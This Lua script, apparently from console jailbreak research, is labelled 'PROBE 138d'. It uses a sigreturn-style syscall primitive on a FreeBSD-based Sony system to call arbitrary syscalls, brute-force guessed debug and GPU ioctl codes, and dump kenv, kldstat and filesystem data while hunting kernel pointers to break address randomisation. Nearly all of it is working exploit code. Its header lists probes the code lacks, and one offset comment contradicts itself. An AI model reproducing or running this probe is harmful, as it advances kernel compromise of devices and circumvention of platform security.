-- CRASH_CLASS: LOW
-- PROBE 138d: Deep kernel pointer hunt via SROP
--
-- Multiple untested or under-tested syscalls via proper SROP:
-- A: DECI ioctl (deci_stdout) — Sony TTY/debug codes
-- B: pipe2(542) — might work where pipe(42) failed via make_syscall
-- C: kenv(390) — with proper arg layout
-- D: kldstat(308) / kldsym(337) — with correct struct sizes
-- E: getfsstat(18) — mounted filesystems info
-- F: socket info probes: AF_LOCAL, AF_INET6 getsockname/getpeername
-- G: gc device ioctl (GPU compute) — Sony ioctl catalog codes
-- H: thread stack scan after thr_create

print("=== PROBE 138d: KPTR DEEP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

local buf1 = gpu + 0x100
local buf2 = gpu + 0x500
local buf3 = gpu + 0x900

local function scan_kptr(buf, len, label)
    for off = 0, len - 1, 8 do
        local v = safe_rq(buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print(string.format("  *** KPTR %s+0x%02X: %s ***", label, off, hex(v)))
            end
        end
    end
end

local function dump_nonzero(buf, len, label)
    for off = 0, len - 1, 8 do
        local v = safe_rq(buf + off)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh > 0 or vl > 0 then
                print(string.format("  %s+0x%02X: %s", label, off, hex(v)))
            end
        end
    end
end

--------------------------------------------------------------------
-- A: DECI ioctl on deci_stdout
--------------------------------------------------------------------
print("")
print("--- [A] DECI ioctl ---")
ws(buf1, "/dev/deci_stdout")
local deci_fd = srop(5, ua(buf1), uint64(0x2005))
local dh, dl = get_hi_lo(deci_fd)
if dl > 0 and dl < 256 and dh == 0 then
    print("[A] deci_stdout fd=" .. dl)
    local hits = 0
    -- TTY group 't'=0x74, DECI custom guesses
    local codes = {
        0x40487413, -- TIOCGETA
        0x40087468, -- TIOCGWINSZ
        0x4004667F, -- FIONREAD
        0x40047463, -- TIOCGSID
        0x40047477, -- TIOCGPGRP
        0x40087414, -- TIOCGETD
        -- DECI custom: group 'D'=0x44 (Debug)
        0x40044400, 0x40044401, 0x40044402, 0x40044403,
        0x40044404, 0x40044405, 0x40044406, 0x40044407,
        0x40084400, 0x40084401, 0x40084402, 0x40084403,
        0x40104400, 0x40104401, 0x40104402,
        0xC0044400, 0xC0044401, 0xC0044402,
        0xC0084400, 0xC0084401, 0xC0084402,
        -- group 'd'=0x64 (deci lowercase)
        0x40046400, 0x40046401, 0x40046402,
        0x40086400, 0x40086401,
        0xC0046400, 0xC0046401,
        -- void direction
        0x20004400, 0x20004401, 0x20004402,
        0x20006400, 0x20006401,
    }
    for _, code in ipairs(codes) do
        zero(buf2, 0x100)
        local rv = srop(54, uint64(dl), uint64(code), ua(buf2))
        local ivh, ivl = get_hi_lo(rv)
        if ivl == 0 and ivh == 0 then
            hits = hits + 1
            print(string.format("[A] *** ioctl 0x%08X WORKS!", code))
            dump_nonzero(buf2, 0x48, "io")
            scan_kptr(buf2, 0x48, "io")
        end
    end
    print("[A] hits=" .. hits)
    srop(6, uint64(dl))
else
    print("[A] deci_stdout OPEN FAIL")
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: pipe2(542)
--------------------------------------------------------------------
print("")
print("--- [B] pipe2 ---")
zero(buf1, 0x10)
local rv_p2 = srop(542, ua(buf1), uint64(0))
print("[B] pipe2=" .. hex(rv_p2))
local pfd0 = to_num(memory.read_dword(buf1))
local pfd1 = to_num(memory.read_dword(buf1 + 4))
print("[B] fds=" .. pfd0 .. "," .. pfd1)
if pfd0 > 0 and pfd0 < 256 then
    -- Write to pipe, read back — check if kernel leaves any metadata
    zero(buf2, 0x100)
    ws(buf2, "PIPE_TEST")
    srop(4, uint64(pfd1), ua(buf2), uint64(9))
    zero(buf3, 0x100)
    local rv_rd = srop(3, uint64(pfd0), ua(buf3), uint64(0x100))
    print("[B] pipe read=" .. hex(rv_rd))
    -- fstat the pipe fd
    zero(buf2, 0x100)
    srop(189, uint64(pfd0), ua(buf2))
    dump_nonzero(buf2, 0x80, "pipe_stat")
    scan_kptr(buf2, 0x80, "pipe_stat")
    srop(6, uint64(pfd0))
    srop(6, uint64(pfd1))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: kenv(390) — action=0 (KENV_GET), various names
--------------------------------------------------------------------
print("")
print("--- [C] kenv ---")
local kenv_names = {"vfs.root.mountfrom", "kern.consfail", "hw.machine", "init_path", "kern.module_path"}
for _, kname in ipairs(kenv_names) do
    ws(buf1, kname)
    zero(buf2, 0x200)
    local rv_ke = srop(390, uint64(0), ua(buf1), ua(buf2), uint64(0x200))
    local keh, kel = get_hi_lo(rv_ke)
    if kel > 0 and kel < 0x200 and keh == 0 then
        local s = ""
        for i = 0, math.min(kel, 80) - 1 do
            local b = to_num(memory.read_byte(buf2 + i))
            if b >= 32 and b < 127 then s = s .. string.char(b) end
        end
        print(string.format("[C] %s (%d bytes): %s", kname, kel, s))
        scan_kptr(buf2, math.min(kel, 0x200), kname)
    else
        print(string.format("[C] %s = %s", kname, hex(rv_ke)))
    end
end
-- KENV_DUMP (action=3) — dump all env vars
zero(buf2, 0x1000)
local rv_kd = srop(390, uint64(3), uint64(0), ua(buf2), uint64(0x1000))
local kdh, kdl = get_hi_lo(rv_kd)
print("[C] kenv_dump=" .. hex(rv_kd))
if kdl > 0 and kdl < 0x1000 and kdh == 0 then
    print("[C] dump size=" .. kdl)
    local s = ""
    for i = 0, math.min(kdl, 300) - 1 do
        local b = to_num(memory.read_byte(buf2 + i))
        if b == 0 then s = s .. " | "
        elseif b >= 32 and b < 127 then s = s .. string.char(b) end
    end
    print("[C] " .. s)
    scan_kptr(buf2, math.min(kdl, 0x1000), "kenv_dump")
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- D: kldstat(308) via SROP
--------------------------------------------------------------------
print("")
print("--- [D] kldstat ---")
-- struct kld_file_stat { int version; char name[256]; int refs; int id;
--   unsigned long address; size_t size; ... }
-- version should be sizeof(struct kld_file_stat)
zero(buf2, 0x200)
memory.write_dword(buf2, 0x150)  -- version = sizeof struct (336 bytes)
local rv_kld = srop(308, uint64(1), ua(buf2))
print("[D] kldstat(1)=" .. hex(rv_kld))
local klh, kll = get_hi_lo(rv_kld)
if kll == 0 and klh == 0 then
    print("[D] SUCCESS! Dumping struct:")
    dump_nonzero(buf2, 0x150, "kld")
    scan_kptr(buf2, 0x150, "kld")
    -- Read name at offset 4
    local name = ""
    for i = 4, 260 do
        local b = to_num(memory.read_byte(buf2 + i))
        if b == 0 then break end
        if b >= 32 and b < 127 then name = name .. string.char(b) end
    end
    print("[D] name: " .. name)
    -- address at offset 0x108 (after 4+256+4+4 = 268 = 0x10C)
    local kaddr = safe_rq(buf2 + 0x10C)
    if kaddr then
        print("[D] address: " .. hex(kaddr))
        local kah, kal = get_hi_lo(kaddr)
        if kah >= 0xFFFF8000 and kah ~= 0xFFFFFFFF then
            kfound = kfound + 1
            print("[D] *** KERNEL BASE ADDRESS! ***")
        end
    end
end

-- Also try fileid=0 and fileid=2
for _, fid in ipairs({0, 2, 3}) do
    zero(buf2, 0x200)
    memory.write_dword(buf2, 0x150)
    local rv2 = srop(308, uint64(fid), ua(buf2))
    print(string.format("[D] kldstat(%d)=%s", fid, hex(rv2)))
end
print("[D] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- E: getfsstat(18) — list mounted filesystems
--------------------------------------------------------------------
print("")
print("--- [E] getfsstat ---")
-- First call with NULL buf to get count
local rv_cnt = srop(18, uint64(0), uint64(0), uint64(2))
local cntH, cntL = get_hi_lo(rv_cnt)
print("[E] count=" .. hex(rv_cnt))
if cntL > 0 and cntL < 100 and cntH == 0 then
    -- struct statfs is 0x230 (560 bytes) on FreeBSD
    local statfs_sz = 0x230
    local need = cntL * statfs_sz
    if need > 0x10000 then need = 0x10000 end
    local fs_buf = gpu + 0x2000
    zero(fs_buf, math.min(need, 0x8000))
    local rv_fs = srop(18, ua(fs_buf), uint64(need), uint64(2))
    print("[E] getfsstat=" .. hex(rv_fs))
    local fsh, fsl = get_hi_lo(rv_fs)
    if fsl > 0 and fsl <= cntL and fsh == 0 then
        for i = 0, math.min(fsl, 5) - 1 do
            local base = fs_buf + (i * statfs_sz)
            -- f_fstypename at +0x00 (16 bytes)
            local fstype = ""
            for j = 0, 15 do
                local b = to_num(memory.read_byte(base + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then fstype = fstype .. string.char(b) end
            end
            -- f_mntonname at +0x58 (1024 bytes)
            local mnt = ""
            for j = 0, 79 do
                local b = to_num(memory.read_byte(base + 0x58 + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then mnt = mnt .. string.char(b) end
            end
            print(string.format("[E] fs%d: type=%s mount=%s", i, fstype, mnt))
            scan_kptr(base, statfs_sz, "fs" .. i)
        end
    end
end
print("[E] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- F: gc ioctl (GPU compute device)
--------------------------------------------------------------------
print("")
print("--- [F] gc ioctl ---")
ws(buf1, "/dev/gc")
local gc_fd = srop(5, ua(buf1), uint64(2))
local gch, gcl = get_hi_lo(gc_fd)
if gcl > 0 and gcl < 256 and gch == 0 then
    print("[F] gc fd=" .. gcl)
    -- Sony GPU ioctl codes from catalog: group 'G'=0x47
    local gc_codes = {
        0x40044700, 0x40044701, 0x40044702, 0x40044703,
        0x40044704, 0x40044705, 0x40044706, 0x40044707,
        0x40084700, 0x40084701, 0x40084702, 0x40084703,
        0x40104700, 0x40104701, 0x40104702,
        0x40204700, 0x40204701,
        0x40404700, 0x40404701,
        0xC0044700, 0xC0044701, 0xC0044702,
        0xC0084700, 0xC0084701,
        0xC0104700, 0xC0104701,
        0xC0204700, 0xC0204701,
        0x20004700, 0x20004701, 0x20004702,
    }
    local hits = 0
    for _, code in ipairs(gc_codes) do
        zero(buf2, 0x100)
        local rv = srop(54, uint64(gcl), uint64(code), ua(buf2))
        local ivh, ivl = get_hi_lo(rv)
        if ivl == 0 and ivh == 0 then
            hits = hits + 1
            print(string.format("[F] *** gc ioctl 0x%08X WORKS!", code))
            dump_nonzero(buf2, 0x40, "gc_io")
            scan_kptr(buf2, 0x40, "gc_io")
        end
    end
    print("[F] gc ioctl hits=" .. hits)
    srop(6, uint64(gcl))
else
    print("[F] gc OPEN FAIL")
end
print("[F] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
